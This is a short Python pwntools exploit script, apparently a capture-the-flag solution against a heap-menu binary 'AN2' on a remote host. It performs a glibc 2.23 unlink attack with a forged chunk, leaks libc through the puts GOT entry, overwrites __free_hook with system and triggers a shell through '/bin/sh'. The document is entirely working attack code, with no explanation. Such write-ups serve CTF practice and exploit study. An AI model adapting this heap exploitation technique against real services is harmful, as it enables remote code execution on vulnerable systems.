from pwn import*
p = remote('47.103.214.163',20701)
#p = process('./AN2')
elf = ELF('AN2')
libc = ELF('libc-2.23.so')
puts_got = elf.got['puts']
context.log_level = 'debug'
context(arch = 'amd64',os ='linux')
def add(size,content):
	p.sendline('1')
	p.sendline(str(size)) # 1024> size >=144
	p.sendline(content)
def dele(index):
	p.sendline('2')
	p.sendline(str(index))
def show(index):
	p.sendline('3')
	p.sendline(str(index))
def edit(index,content):
	p.sendline('4')
	p.sendline(str(index))
	p.sendline(content)
stdout = 0x6020A0
List = 0x6020E0
add(0x90,'U'*0x10)	#0
add(0x90,'U'*0x10)	#1
#----------create the fake chunk
payload  = p64(0)
payload += p64(0x90) # size
payload += p64(List - 0x18) # fd List[0]-0x18
payload += p64(List - 0x10) # bk List[0]-0x10
#----------
payload = payload.ljust(0x90,'\x00') #padding
payload += p64(0x90)
payload += p64(0xA0)
edit(0,payload)
dele(1)
payload = 'U'*0x18 + p64(puts_got) + p64(List) + p64(stdout)
edit(0,payload)
edit(2,'\x40\x25')
show(0)
p.recvuntil('content:')
libcbase = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['puts']
log.success('LibcBase:\t' + hex(libcbase))
system = libcbase + libc.sym['system']
str_bin_sh = libcbase + 0x18CD57
free_hook = libcbase + 0x3C67A8
edit(1,p64(free_hook)+p64(str_bin_sh))
edit(0,p64(system))
dele(1)
p.interactive()
